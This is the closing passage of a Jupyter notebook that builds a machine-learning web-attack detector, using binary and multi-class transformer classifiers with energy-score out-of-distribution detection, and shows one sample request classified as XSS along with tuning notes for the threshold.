    "#     # Step 2: Multi-class classification\n",
    "#     multi_inputs = tokenizer(text, return_tensors=\"pt\", truncation=True, max_length=512).to(device)\n",
    "#     multi_outputs = multi_model(**multi_inputs)\n",
    "#     multi_probs = torch.nn.functional.softmax(multi_outputs.logits, dim=-1)\n",
    "    \n",
    "#     # Step 3: OOD detection\n",
    "#     energy = energy_score(multi_outputs.logits).item()\n",
    "#     if energy > energy_threshold:\n",
    "#         return \"unknown_malware\", multi_probs.cpu().detach().numpy()\n",
    "#     else:\n",
    "#         pred_class = torch.argmax(multi_probs).item()\n",
    "#         return model_multi.config.id2label[pred_class], multi_probs.cpu().detach().numpy()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "id": "483252a0",
   "metadata": {},
   "outputs": [],
   "source": [
    "# def detect_attack(text, binary_model, multi_model, tokenizer, energy_threshold=-5, device=\"cuda\"):\n",
    "#     # Ensure models are on the correct device\n",
    "#     binary_model = binary_model.to(device)\n",
    "#     multi_model = multi_model.to(device)\n",
    "    \n",
    "#     inputs = tokenizer(text, return_tensors=\"pt\", truncation=True, max_length=512).to(device)\n",
    "    \n",
    "#     # Step 1: Binary classification\n",
    "#     with torch.no_grad():\n",
    "#         binary_outputs = binary_model(**inputs)\n",
    "#     binary_probs = torch.nn.functional.softmax(binary_outputs.logits, dim=-1)\n",
    "    \n",
    "#     if torch.argmax(binary_probs).item() == 0:  # Benign\n",
    "#         return \"benign\", binary_probs.cpu().detach().numpy()[0]\n",
    "    \n",
    "#     # Step 2: Multi-class classification\n",
    "#     with torch.no_grad():\n",
    "#         multi_outputs = multi_model(**inputs)\n",
    "#     multi_probs = torch.nn.functional.softmax(multi_outputs.logits, dim=-1)\n",
    "    \n",
    "#     # Step 3: OOD detection\n",
    "#     energy = energy_score(multi_outputs.logits).item()\n",
    "#     if energy > energy_threshold:\n",
    "#         # Create probability vector\n",
    "#         unknown_probs = np.zeros(len(multi_model.config.id2label) + 1)\n",
    "#         unknown_probs[-1] = 1.0\n",
    "#         return \"unknown_malware\", unknown_probs\n",
    "#     else:\n",
    "#         pred_class = torch.argmax(multi_probs).item()\n",
    "#         return multi_model.config.id2label[pred_class], multi_probs.cpu().detach().numpy()[0]\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "id": "ad09c854",
   "metadata": {},
   "outputs": [],
   "source": [
    "# # Detect attack\n",
    "# label, probs = detect_attack(\n",
    "#     sample_request,\n",
    "#     binary_model,\n",
    "#     model_multi,\n",
    "#     binary_model_tokenizer,\n",
    "#     energy_threshold=-3  # Tune this threshold on validation data\n",
    "# )\n",
    "\n",
    "# print(f\"Prediction: {label}\")\n",
    "# print(f\"Probabilities: {probs}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "id": "5f5ee684",
   "metadata": {},
   "outputs": [],
   "source": [
    "# if max_prob > 0.95:\n",
    "#     take_action()\n",
    "# else:\n",
    "#     manual_review()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e8d584ed",
   "metadata": {},
   "source": [
    "Threshold Guidance:\n",
    "\n",
    "    Strict Security (Low FPR): energy_threshold = -3\n",
    "\n",
    "    Balanced (Default): energy_threshold = -5\n",
    "\n",
    "    High Sensitivity (Low FN): energy_threshold = -7\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "id": "b0cc4106",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Final Classification: xss\n",
      "Confidence: 100.00%\n",
      "Energy Score: -11.70\n",
      "Binary Probabilities: [1.0741617e-06 9.9999893e-01]\n",
      "Multi-Class Probabilities: [1.17462349e-07 1.33711247e-08 5.04518951e-08 1.11756222e-07\n",
      " 4.50299410e-07 1.14115714e-07 1.49071894e-07 4.65060417e-08\n",
      " 6.28105639e-08 5.61449781e-07 2.20193840e-07 1.11088957e-06\n",
      " 3.85950557e-07 3.40999293e-07 1.82327867e-07 1.95084269e-07\n",
      " 2.85683910e-07 9.99994874e-01 7.23254402e-07]\n",
      "\n"
     ]
    }
   ],
   "source": [
    "result = detect_attack(\n",
    "    text=sample_request,\n",
    "    binary_model=binary_model,\n",
    "    multi_model=model_multi,\n",
    "    tokenizer=binary_model_tokenizer,\n",
    "    energy_threshold=-4  # Tuned from validation data\n",
    ")\n",
    "\n",
    "print(f\"\"\"\n",
    "Final Classification: {result['final_label']}\n",
    "Confidence: {result['confidence']:.2%}\n",
    "Energy Score: {result['energy_score']:.2f}\n",
    "Binary Probabilities: {result['binary_score']}\n",
    "Multi-Class Probabilities: {result['multi_scores']}\n",
    "\"\"\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "78f5f033",
   "metadata": {},
   "source": [
    "To generate Energies we are loading a labeled dataset which should be maintained\n",
    "by the enterprised at the backend and continiously keep updating it\n",
    "with new values to have many differenet energies to predict\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
